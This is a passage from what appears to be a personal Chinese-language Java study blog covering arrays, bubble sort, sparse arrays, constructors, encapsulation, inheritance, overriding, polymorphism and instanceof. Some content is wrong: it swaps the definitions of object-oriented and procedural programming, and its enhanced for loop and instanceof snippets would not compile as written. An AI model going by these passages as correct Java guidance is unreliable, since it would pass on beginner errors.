class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arrays.length; i++) &#123;<br>            System.out.println(arrays[i]);<br>        &#125;<br></code></pre></td></tr></table></figure></li><li><p>计算sum</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arrays.length; i++) &#123;<br>          sum += arrays[i];<br>      &#125;<br>      System.out.println(<span class="hljs-string">&quot;sum=&quot;</span> + sum);<br></code></pre></td></tr></table></figure></li><li><p>寻找max</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> arrays[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; arrays.length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (arrays[i] &gt; max) &#123;<br>                max = arrays[i];<br>            &#125;<br>        &#125;<br>        <br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>增强for循环</p><p><code>快捷语句：array.for</code>        省略了数组下标</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> array  :  array)&#123;<span class="hljs-comment">//int array相当于下标，array相当于这个数组</span><br>    System.out.println(array);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>分装成方法的参数&#x2F;&#x2F;数组作为返回值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//打印数组</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printArray</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arrays)</span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arrays.length; i++) &#123;<br>            System.out.print(arrays[i] + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>    &#125; <br><br><span class="hljs-comment">//反转数组 </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[] reverse(<span class="hljs-type">int</span>[] arrays)&#123;<br>    <span class="hljs-type">int</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[arrays.length];<br><br>    <span class="hljs-comment">//反转的操作</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,j=result.length-<span class="hljs-number">1</span>; i &lt; arrays.length; i++,j--) &#123;<br>        result[j] = arrays[i];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>多维数组</p><p>数组的多重嵌套</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//输出二维数组</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; array.length ; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; array[i].length ; j++) &#123;<br>                System.out.println(array[i][j]);<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><ul><li>第一个条件 <code>i &lt; array.length</code> 是限制<strong>行下标 <code>i</code></strong> 的，<code>array.length</code> 表示二维数组的行数，确保 <code>i</code> 不会超出行的范围。</li><li>第二个条件 <code>j &lt; array[i].length</code> 是限制<strong>列下标 <code>j</code></strong> 的，<code>array[i].length</code> 表示第 <code>i</code> 行的列数，确保 <code>j</code> 不会超出当前行的列范围。</li></ul></li></ul><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><ol><li><p>arrays类</p><ul><li>数组的工具类java.util.Arrays</li><li>由于数组对象本身并没有什么方法可以供我们调用,但API中提供了一个工具类Arrays供我们使用,从而可以对数据对象进行一些基本的操作。</li><li>查看JDK帮助文档</li><li>Arrays类中的方法都是static修饰的静态方法,在使用的时候可以直接使用类名进行调用,而”不用“使用对象来调用(注意:是”不用”而不是“不能”)</li><li>具有以下常用功能:<br>◆给数组赋值:通过 fi 方法。<br>◆对数组排序:通过 sort 方法,<strong>升序</strong>,<br>◆比较数组:通过 equals 方法比较数组中元素值是否相等<br>◆查找数组元素:通过 binarySearch 方法能对排序好的数组进行二分查找法操作。</li></ul></li><li><p>冒泡排序（两层循环）</p><p>两两相邻比较，出现大小差异就交换顺序</p><p>每次比较都会出现max和min，下一轮就减少一次循环</p><p>依次循环，直到结束</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[] sort(<span class="hljs-type">int</span>[] array)&#123;<br>    <span class="hljs-comment">//临时变量</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">//外层循环，判断我们这个要走多少次；</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; array.length-<span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-comment">//内层循环，比价判断两个数，如果第一个数，比第二个数大，则交换位置</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; array.length-<span class="hljs-number">1</span>-i ; j++) &#123;<br>            <span class="hljs-keyword">if</span> (array[j+<span class="hljs-number">1</span>]&gt;array[j])&#123;<br>                temp = array[j];<br>                array[j] = array[j+<span class="hljs-number">1</span>];<br>                array[j+<span class="hljs-number">1</span>] = temp;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> array;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>稀疏数组</p><ul><li><p>当一个数组中大部分元素为0，或者为同一值的数组时，可以使用稀疏数组来保存该数组</p></li><li><p>稀疏数组的处理方式是:</p><p>◆记录数组一共有几行几列，有多少个不同值<br>◆把具有不同值的元素和行列及值记录在一个小规模的数组中，从而缩小程序的规模</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125545873.png" alt="image-20251022164858914"></p><p>左边是原始数组，右边是压缩数组</p><ul><li>共六行七列（除去0），只有8个有效数字——-&gt;初始数组都是0（初始化）</li><li>后面就是坐标定位有效值                            ——-&gt;赋值替换有效值</li></ul></li></ol><h1 id="面向对象（op）"><a href="#面向对象（op）" class="headerlink" title="面向对象（op）"></a>面向对象（op）</h1><h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2><p>面向对象    vs      面向过程</p><ul><li>面向对象：是线性的（第一步，第二步这样）——&gt;框架</li><li>面向过程：是分类思维（分类进行独立思考）——&gt;流程</li></ul><h2 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h2><p>面尚对象编程的本质就是:<strong>以类的方式组织代码，以对象的组织(封装)数据</strong></p><p>三大特性:<strong>封装   继承   多态</strong></p><p>从认识论角度考虑是先有对象后有类。对象，是具体的事物。类，是抽象的，是对对象的抽象</p><p>从<strong>代码运行角度考虑是先有类后有对象</strong>。类是对象的模板。</p><h2 id="类与对象的关系"><a href="#类与对象的关系" class="headerlink" title="类与对象的关系"></a>类与对象的关系</h2><ol><li><p>一个项目应该只存在一个main方法</p></li><li><p>一个类里面，只有可能存在<strong>属性和方法</strong>这俩东西</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//学生类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-comment">//属性：字段</span><br>    String name;<span class="hljs-comment">//默认值nell</span><br>    <span class="hljs-type">int</span> age;<span class="hljs-comment">//默认值0</span><br><br>    <span class="hljs-comment">//方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">study</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot;在学习&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>this.name</code>指的是在这个类里面的属性</p></li><li><p>类——-&gt;对象           抽象——-&gt;实例</p><p>先输入 <code>new 类名()</code>（如 <code>new Student()</code>），然后使用快捷键 **<code>Ctrl + Alt + V</code>**，IDEA 会自动生成变量声明语句（如 <code>Student student = new Student();</code>）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//类：抽象的，实例化</span><br>        <span class="hljs-comment">//类实例化后会返回一个自己的对象！</span><br>        <span class="hljs-comment">//student对象就是一个Student类的具体实例！</span><br>        <br><span class="hljs-type">Student</span> <span class="hljs-variable">xiaoming</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<span class="hljs-comment">//Student student = new student();</span><br><span class="hljs-type">Student</span> <span class="hljs-variable">xh</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<span class="hljs-comment">//Student student = new student();</span><br><br>xiaoming.name = <span class="hljs-string">&quot;小明&quot;</span>;<br>    xiaoming.age = <span class="hljs-number">3</span>;<br><br>System.out.println(xiaoming.name);<br>System.out.println(xiaoming.age);<br><br>System.out.println(xh.name);<br>System.out.println(xh.age);<br>&#125;<br></code></pre></td></tr></table></figure><p>结合上面写的，xiaoming.name &#x3D; “小明”;          xiaoming.age &#x3D; 3;这个对象已经赋值，所以返回赋值内容</p><p>xh这个对象并没有赋值，所以返回默认值</p></li></ol><h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><p>生成alt+insert</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//java ---&gt; class</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><br>    <span class="hljs-comment">//一个类即使什么都不写，它也会存在一个方法</span><br>    <span class="hljs-comment">//显示的定义构造器</span><br>    String name;<br><br>    <span class="hljs-comment">//实例化初始值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;小明&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//一个项目应该只存一个main方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//new 实例化了一个对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//////如果在里断点</span><br><br>        System.out.println(person.name); <span class="hljs-comment">//aaaa</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用断点检测：</p><ol><li>没走就是null</li><li>先到类里面的public Person</li><li>后面赋值”小明”（赋值是person类里面的  <code>String name;</code>）</li><li>接着再次回到new</li><li>然后接着往下走</li></ol><p>作用：</p><ul><li>使用new关键字，不质是在调用构造器</li><li>用来初始化值</li></ul><p>构造器:<br>1.和类名相同<br>2.没有返回值<br>作用:<br>1.new 本质在调用构造方法<br>2.初始化对象的值<br>注意点:<br>1.定义有参构造之后，如果想使用无参构造，显示的定义一个无参的构造<br>2.alt+insert<br>3.this.     &#x3D;      </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span>类<br><span class="hljs-number">2.</span>方法<br><span class="hljs-number">3.</span>引用类型:基本类型(<span class="hljs-number">8</span>)对象是通过引用来操作的:栈---&gt;堆<br><span class="hljs-number">4.</span>属性:字段Field 成员变量<br>默认初始化:<br>数字:<span class="hljs-number">8</span><br><span class="hljs-number">0.8</span><br>u0000char :<br><span class="hljs-type">boolean</span>:<span class="hljs-literal">false</span><br>引用:<span class="hljs-literal">null</span><br>修饰符 属性类型 属性名= 属性值!<br><span class="hljs-number">5.</span>对象的创建和使用<br>-必须使用<span class="hljs-keyword">new</span> 关键字创造对象，构造器 <span class="hljs-type">Person</span> <span class="hljs-variable">kuangshen</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();-对象的属性kuangshen.name对象的方法kuangshen.sleep()<br>类:静态的属性动态的行为<br></code></pre></td></tr></table></figure><p>理解：</p><p>构造器随着对象创建而直接调用，而使用方法还得手动调用</p><p>（就像，人出生就伴随的  身份证号码，是否在呼吸；但是跑步，游泳是可选择的）</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><ul><li><p>该露的露，该藏的藏</p></li><li><p>我们程序设计要追求“高内聚，低耦合”。高内聚就是类的内部数据操作细节自己完成，不允许外部干涉;低耦合:仅暴露少量的方法给外部使用。</p></li><li><p>封装(数据的隐藏)：<br>通常，应禁止直接访问一个对象中数据的实际表示，而应通过操作接口来访问，这称为信息隐藏</p></li></ul><p><strong>属性私有，get&#x2F;set</strong></p><p><img src="C:\Users\95227\Desktop\image-20251024164516243.png" alt="image-20251024164516243"></p><p><code>private</code>私有属性之后，在main里面调用就会报错</p><p><code>public</code>就不会</p><h3 id="如何调用："><a href="#如何调用：" class="headerlink" title="如何调用："></a>如何调用：</h3><p>get&#x2F;set（快捷键alt+insert）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125555451.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        s1.setName(<span class="hljs-string">&quot;秦疆&quot;</span>);<br>        System.out.println(s1.getName());<br>        s1.setAge(-<span class="hljs-number">1</span>);<span class="hljs-comment">//不合法的</span><br>        System.out.println(s1.getAge());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>get用于Application的调用后的<strong>输出</strong>，set用于调用<strong>赋值</strong></p><p>意义：</p><ul><li><p>提高程序的安全性，保护数据</p><p>也可以直接在封装内部附加条件，对不合法信息进行过滤</p></li><li><p>隐藏代码的实现细节</p><p>封装之后看不到，数据隐藏</p></li><li><p>统一接口</p><p>只使用get和set接口</p></li><li><p>系统可维护增加了</p></li></ul><p><strong>理解为什么要封装：</strong></p><p>使用有if的<code>public</code>方法&amp;&amp;使用内部if的<code>private</code></p><p>public：有条件，可以不走条件，公开属性可以修改（绕过过滤）</p><p>private：有条件，必须走条件，不合法只能被拦截</p><p>比如：</p><ul><li>public你家大门上挂了个 “请按门铃” 的牌子，大门没锁<ul><li>有素质的人会按门铃</li><li>但没素质的人可以直接推门而入，牌子形同虚设</li></ul></li><li>private想进门必须按门铃（必须调用方法），想绕都绕不过去</li></ul><h2 id="重载-1"><a href="#重载-1" class="headerlink" title="重载"></a>重载</h2><p>比如println可以输出许多东西</p><p>步入方法就会知道，写了   许多<code>相同方法名</code>的<code>不同参数</code>的<code>方法</code></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125559530.png" alt="image-20251024172431860"></p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><ul><li><p>继承的本质是对某一批类的抽象，从而实现对现实世界更好的建模。</p></li><li><p>extends的意思是“扩展”。子类是父类的扩展</p></li><li><p><strong>JAVA中类只有单继承，没有多继承!<strong>（但是可以通过接口实现）（想了解的直接跳的</strong>接口</strong>标题查看）</p><p>一个儿子一个爹；一个爹好几个儿子</p><p>◆ 继承是类和类之间的一种关系。除此之外,类和类之间的关系还有依赖、组合、聚合等</p><p>◆ 继承关系的俩个类，一个为子类(派生类),一个为父类(基类)。子类继承父类,使用关键字extends来表示,</p><p>◆ 子类和父类之间,从意义上讲应该具有”is a”的关系.</p><p>◆ 子类可以继承父类的所有<strong>方法</strong></p><p>◆ 子类<strong>无法</strong>继承父类private</p><p>但是可以通过get&#x2F;set通过一些特定条件来调用（不能继承，但是留了点接口；不能让你随便花钱，但是可以给你留点）</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span>  <span class="hljs-title class_">Person</span>&#123;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span>&#123;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>学生 是 人（student继承 person）</p><p><strong>感觉像是树形图</strong>（ctrl+H可以打开继承树）</p><ul><li><p>也可以组合：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    Person person;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>父类上面，还有object：</p><p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20251024173831717.png"></p><p>因为object是所有类的父类，所有的类，都默认直接或者间接继承object</p></li></ul><h2 id="Super"><a href="#Super" class="headerlink" title="Super"></a>Super</h2><ul><li><p>Super对比this</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125603049.png" alt="image-20251024174447756"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(name); <span class="hljs-comment">// 输出方法的传参参数</span><br>System.out.println(<span class="hljs-built_in">this</span>.name); <span class="hljs-comment">// 输出当前类的成员变量</span><br>System.out.println(<span class="hljs-built_in">super</span>.name); <span class="hljs-comment">// 输出父类的成员变量</span><br></code></pre></td></tr></table></figure></li><li><p>类内部有默认的构造器<br>在的父类写构造器，写输出<br>在子类写构造器，写输出<br>在所在类内部new一个子类，执行发现：先输出父类，在输出子类<br>也就是说，存在隐藏代码，就是调用父类的构造器</p><p>如果父类是有参的，子类是无参的<br>new一个对象发现，调用不了（父类不能用，子类也不能用）</p></li><li><p>总结</p><ul><li><p>super注意点:<br>1.super调用父类的构造方法，必须在构造方法的第一个</p><p>2.super 必须只能出现在子类的方法或者构造方法中!</p><p>3.super和 this 不能同时调用构造方法!</p><p>​因为这两个都要放在第一行，一起用就冲突了</p></li><li><p>Vs this:<br>代表的对象不同:<br>this:本身调用者这个对象</p><p>super:代表父类对象的应用</p><p>前提：<br>this：没有继承也可以使用<br>super：只能在继承条件才可以使用</p><p>构造方法：</p><p>this()：本类的构造<br>super()：父类的构造!</p></li></ul></li></ul><h2 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h2><p>是方法的重写，和属性无关</p><ul><li><p>有static的情况</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125605929.png" alt="image-20251024211537644"></p><p>父类有text方法，子类也有text方法</p><p>调用时，A和B方法不同，但是<strong>父类的引用指向了子类</strong></p><p>静态方法不支持重写</p><p>这<strong>不是</strong> “方法重写”，（因为静态方法不支持重写，只是 “子类定义了同名静态方法）</p></li><li><p>无static</p><p>而且重写的关键词只能是public不能是private</p><p>而且还会出现注释  @Override</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125608057.png" alt="image-20251024212744560"></p><p>相当于子类重写了父类的方法</p><p>第一个输出是子类的</p><p>第二个输出还是子类（B   b &#x3D; new A()  父类被重写）</p></li></ul><p>总结：</p><p>重写:需要有继承关系，子类重写父类的方法!<br>1.方法名必须相同<br>2.参数列表列表必须相同<br>3.修饰符:范围可以扩大但不能缩小                      public&gt;Protected&gt;Default&gt;private<br>4.抛出的异常:范围，可以被缩小，但不能扩大:  classNotFoundException （小）—–&gt;Exception(大)<br>重写，子类的方法和父类必要一致;方法体不同!</p><p>为什么需要重写:<br>父类的功能，子类不一定需要，或者不一定满足</p><p><strong>重写   VS   重载</strong>:</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125609553.png" alt="image-20251024213257448"></p><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>其实上面说的重写就是体现多态</p><p>为了让子类能够根据自身特性 “定制” 父类的行为，从而让代码更灵活、更贴合场景</p><p>就是我在上面写的    <code>有static的情况</code>   和  <code>无static的这两种</code></p><p><strong>注意事项：</strong></p><ol><li>多态是方法的多态，属性没有多态</li><li>父类和子类，有联系 类型转换异常！ClassCastException！</li><li>存在条件： 继承关系，方法需要重写，父类引用指向子类对象！ Father f1 &#x3D; new Son ();</li></ol><p>不能重写的：</p><ol><li>static 方法，属于类，它不属于实例</li><li>final 常量；</li><li>private 方法；</li></ol><h2 id="instanceof和类型转换"><a href="#instanceof和类型转换" class="headerlink" title="instanceof和类型转换"></a>instanceof和类型转换</h2><ul><li><p>instanceof</p><p>(类型转换) 引用类型，判断一个对象是什么类</p><p><strong>满足父子关系就是ture    否则就是false</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//Object &gt; String</span><br>    <span class="hljs-comment">//Object &gt; Person &gt; Teacher</span><br>    <span class="hljs-comment">//Object &gt; Person &gt; Student</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br><br>    System.out.println(object <span class="hljs-keyword">instanceof</span> Student); <span class="hljs-comment">//true</span><br>    System.out.println(object <span class="hljs-keyword">instanceof</span> Person); <span class="hljs-comment">//true</span><br>    System.out.println(object <span class="hljs-keyword">instanceof</span> Object); <span class="hljs-comment">//true</span><br>    System.out.println(object <span class="hljs-keyword">instanceof</span> Teacher); <span class="hljs-comment">//False</span><br>    System.out.println(object <span class="hljs-keyword">instanceof</span> String); <span class="hljs-comment">//False</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如果将<code>object</code>变成<code>Person</code></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">System.out.<span class="hljs-keyword">println</span>(Person <span class="hljs-keyword">instanceof</span> Student); <span class="hljs-comment">//true</span><br>   System.out.<span class="hljs-keyword">println</span>(Person <span class="hljs-keyword">instanceof</span> Person); <span class="hljs-comment">//true</span><br>   System.out.<span class="hljs-keyword">println</span>(Person <span class="hljs-keyword">instanceof</span> Object); <span class="hljs-comment">//true</span><br>   System.out.<span class="hljs-keyword">println</span>(Person <span class="hljs-keyword">instanceof</span> Teacher); <span class="hljs-comment">//False</span><br>   System.out.<span class="hljs-keyword">println</span>(Person <span class="hljs-keyword">instanceof</span> String); <span class="hljs-comment">//编译报错（Person和String是同级的）</span><br></code></pre></td></tr></table></figure><p>换成<code>Student</code></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">System.out.<span class="hljs-keyword">println</span>(Student <span class="hljs-keyword">instanceof</span> Student); <span class="hljs-comment">//true</span><br>   System.out.<span class="hljs-keyword">println</span>(Student <span class="hljs-keyword">instanceof</span> Person); <span class="hljs-comment">//true</span><br>   System.out.<span class="hljs-keyword">println</span>(Student <span class="hljs-keyword">instanceof</span> Object); <span class="hljs-comment">//true</span><br>   System.out.<span class="hljs-keyword">println</span>(Student <span class="hljs-keyword">instanceof</span> Teacher); <span class="hljs-comment">//编译报错</span><br>   System.out.<span class="hljs-keyword">println</span>(Student <span class="hljs-keyword">instanceof</span> String); <span 